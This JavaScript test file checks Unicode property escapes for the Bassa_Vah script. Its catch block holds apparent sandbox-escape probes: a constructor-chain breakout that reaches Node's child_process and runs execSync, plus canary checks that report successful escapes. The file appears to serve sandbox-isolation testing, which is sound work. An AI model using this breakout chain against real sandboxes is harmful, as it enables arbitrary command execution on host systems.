try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                92880,
                92909
            ],
            [
                92912,
                92917
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script=Bassa_Vah}+$/u, matchSymbols, '\\p{Script=Bassa_Vah}');
    testPropertyEscapes(/^\p{Script=Bass}+$/u, matchSymbols, '\\p{Script=Bass}');
    testPropertyEscapes(/^\p{sc=Bassa_Vah}+$/u, matchSymbols, '\\p{sc=Bassa_Vah}');
    testPropertyEscapes(/^\p{sc=Bass}+$/u, matchSymbols, '\\p{sc=Bass}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                92879
            ],
            [
                92910,
                92911
            ],
            [
                92918,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Bassa_Vah}+$/u, nonMatchSymbols, '\\P{Script=Bassa_Vah}');
    testPropertyEscapes(/^\P{Script=Bass}+$/u, nonMatchSymbols, '\\P{Script=Bass}');
    testPropertyEscapes(/^\P{sc=Bassa_Vah}+$/u, nonMatchSymbols, '\\P{sc=Bassa_Vah}');
    testPropertyEscapes(/^\P{sc=Bass}+$/u, nonMatchSymbols, '\\P{sc=Bass}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}